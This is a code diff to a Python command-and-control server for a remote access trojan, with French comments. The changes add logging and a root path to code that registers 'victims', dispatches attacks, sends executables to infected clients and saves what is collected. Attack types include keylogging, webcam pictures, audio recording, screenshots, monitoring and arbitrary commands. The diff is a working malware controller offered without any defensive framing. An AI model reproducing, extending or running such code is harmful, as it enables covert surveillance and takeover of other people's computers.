@@ -35,6 +35,7 @@ def start_server(port, logger):
     socket_server.bind((host, port))
     socket_server.listen()
     print("ecoute sur : " + str(host) + ":" + str(port))
+    logger.info("ecoute sur : " + str(host) + ":" + str(port))
 
 
     connection_list = [socket_server]
@@ -87,6 +88,7 @@ def start_server(port, logger):
                 conn.sendall(encrypted_sym_key)
 
                 print("[+] Waiting for client handshake informations")
+                logger.info("attente des informations de handshake du client")
 
                 # Réception de la configuration du client (96 octets)
                 received_data = conn.recv(96)
@@ -94,12 +96,14 @@ def start_server(port, logger):
                 cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
                 pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
                 print("\t(+) config received")
+                logger.info("configuration reçue : " + pt)
 
                 # Récupération de l'uid client
                 uid = json.loads(pt)["uid"]
                 client_os = json.loads(pt)["os"]
 
                 print("\t(+) uid : " + str(uid))
+                logger.info("uid du client : " + str(uid))
 
 
                 # Ajout de la victime en base de données
@@ -112,7 +116,7 @@ def start_server(port, logger):
                 thread_emission.start()
 
                 reception_queue = Queue()
-                thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr, sym_key, iv))
+                thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr, sym_key, iv, logger))
                 thread_reception.start()
                 
 
@@ -157,11 +161,12 @@ def start_server(port, logger):
             for victim_uid in victims_uid:
                 if is_attacking(mycursor, victim_uid):
                     print("[!] delaying attack, client is already attacking")
+                    logger.info("attaque retardée, la victime est déjà attaquée")
 
                 else :
                     for client in clients:
                         if client['uid'] == victim_uid[0]:
-                            execute_attack(client, attack)
+                            execute_attack(client, attack, logger)
                             attack_sent = True
                             number_of_attackers += 1
 
@@ -206,13 +211,15 @@ def start_server(port, logger):
                 for client in clients:
                     if is_attacking(mycursor, victim_uid):
                         print("[!] delaying attack, client is already attacking")
+                        logger.info("attaque retardée, la victime est déjà attaquée")
 
                     else :
                         print("[+] executing victim attack :")
                         print("\t[+]", str(attack[2]))
+                        logger.info("lancement de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid))
                         
                         try:
-                            execute_attack(client, attack)
+                            execute_attack(client, attack, logger)
                             logger.info("lancement de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid))
                         except Exception as e:
                             logger.error("erreur lors de l'envoi de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid) + " : " + str(e))
@@ -239,6 +246,7 @@ def start_server(port, logger):
                 # Check si le client s'est deconnecté
                 if client_data == b'disconnected':
                     print("[-] client disconnected " + str(client['addr']))
+                    logger.info("client déconnecté : " + str(client['addr']))
 
                     # Mise à jour du statut dans la base de données
                     update_status(db, mycursor, client['uid'])
@@ -262,7 +270,7 @@ def start_server(port, logger):
                 if "request" in client_message:
                     # envoyer l'executable au client
                     try:
-                        send_executable_to_client(client_message["request"], client['os'], client['sym_key'], client['iv'], client['reception_queue'], client['emission_queue'])
+                        send_executable_to_client(client_message["request"], client['os'], client['sym_key'], client['iv'], client['reception_queue'], client['emission_queue'], logger)
                         logger.info("envoi de l'executable : " + client_message["request"] + " au client : " + str(client['uid']))
                     except Exception as e:
                         print("[-] error while sending executable to client : " + str(e))
@@ -279,16 +287,16 @@ def start_server(port, logger):
                         query = "UPDATE group_attacks SET state = 'done', result = %s WHERE id = %s"
                     else :
                         # Vérification de l'existence du dossier pour y mettre le resultat de l'attaque
-                        if not os.path.exists("results/" + str(attack_type) + "/" + str(client['uid']) + "/"):
-                            os.makedirs("results/" + str(attack_type) + "/" + str(client['uid']) + "/")
+                        if not os.path.exists(ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/"):
+                            os.makedirs(ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/")
                         
                         # Choix du nom du fichier de résultat (extension différente selon le type d'attaque)
                         if attack_type == "record":
-                            result_file_name = "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".wav"
+                            result_file_name = ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".wav"
                         elif attack_type == "picture" or attack_type == "screenshot" or attack_type == "monitor":
-                            result_file_name = "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".png"
+                            result_file_name = ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".png"
                         elif attack_type == "scan" or attack_type == "keylogger" or attack_type == "command":
-                            result_file_name = "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".txt"
+                            result_file_name = ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".txt"
                         
                         # Ecriture du résultat dans le fichier
                         with open(result_file_name, "wb") as f:
